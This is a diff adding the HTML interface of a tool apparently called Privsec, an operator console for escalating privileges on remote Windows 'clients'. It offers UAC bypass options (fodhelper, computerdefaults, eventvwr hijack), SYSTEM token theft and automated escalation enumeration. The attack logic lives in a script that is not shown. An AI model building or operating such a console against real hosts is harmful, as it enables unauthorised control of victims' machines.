@@ -1,0 +1,100 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Privsec</title>
+  <link rel="stylesheet" href="privsec.css" />
+</head>
+<body>
+  <header class="topbar">
+    <h1>Privsec</h1>
+    <span class="tag">privilege escalation</span>
+    <span id="statusBadge" class="badge idle">idle</span>
+  </header>
+
+  <main class="layout">
+    <section class="col left">
+      <div class="card">
+        <h2>source client</h2>
+        <label for="clientId">client id</label>
+        <div class="row">
+          <input id="clientId" list="clientsList" placeholder="enter client id" autocomplete="off" />
+          <datalist id="clientsList"></datalist>
+          <button id="refreshClients" class="btn ghost">&#8635;</button>
+        </div>
+        <div id="clientCount" class="hint">no clients seen yet</div>
+        <button id="recon" class="btn primary block">recon privileges</button>
+      </div>
+
+      <div class="card">
+        <h2>uac</h2>
+        <button id="checkUac" class="btn block">check uac policy</button>
+        <label for="bypassMethod">bypass method</label>
+        <select id="bypassMethod">
+          <option value="fodhelper">fodhelper.exe (most reliable)</option>
+          <option value="computerdefaults">computerdefaults.exe</option>
+          <option value="eventvwr">eventvwr.exe (MMC hijack)</option>
+        </select>
+        <label for="uacCommand">command to run elevated</label>
+        <input id="uacCommand" placeholder="cmd.exe /c whoami > C:\temp\proof.txt" />
+        <button id="uacBypass" class="btn danger block">attempt uac bypass</button>
+      </div>
+
+      <div class="card">
+        <h2>token theft</h2>
+        <button id="listTokens" class="btn ghost block">list SYSTEM processes</button>
+        <label for="targetPid">target pid</label>
+        <input id="targetPid" type="number" placeholder="pick from the list" />
+        <label for="tokenCommand">spawn as SYSTEM (optional)</label>
+        <input id="tokenCommand" placeholder="cmd.exe /c whoami" />
+        <button id="stealToken" class="btn danger block">steal token</button>
+        <div class="hint">needs admin + SeDebugPrivilege. this is the biggest single jump available.</div>
+      </div>
+
+      <div class="card">
+        <h2>auto</h2>
+        <button id="escalate" class="btn primary block">enumerate paths</button>
+        <div class="hint">walks the techniques in order of likelihood and reports which apply.</div>
+      </div>
+    </section>
+
+    <section class="col right">
+      <div class="card">
+        <h2>posture</h2>
+        <div id="posture" class="info empty">not probed — run recon</div>
+      </div>
+
+      <div class="card">
+        <h2>advice</h2>
+        <div id="advice" class="advice empty">run recon to get a recommendation</div>
+      </div>
+
+      <div class="card">
+        <h2>system processes <span id="tokCount" class="count">0</span></h2>
+        <table class="tbl">
+          <thead><tr><th>pid</th><th>name</th><th></th></tr></thead>
+          <tbody id="tokBody"></tbody>
+        </table>
+        <div id="tokEmpty" class="empty">none listed — run "list SYSTEM processes"</div>
+      </div>
+
+      <div class="card">
+        <h2>attempts <span id="escCount" class="count">0</span></h2>
+        <table class="tbl">
+          <thead><tr><th>technique</th><th>result</th><th>detail</th></tr></thead>
+          <tbody id="escBody"></tbody>
+        </table>
+        <div id="escEmpty" class="empty">nothing attempted yet</div>
+      </div>
+
+      <div class="card">
+        <h2>log</h2>
+        <div id="log" class="log"></div>
+      </div>
+    </section>
+  </main>
+
+  <script src="privsec.js"></script>
+</body>
+</html>
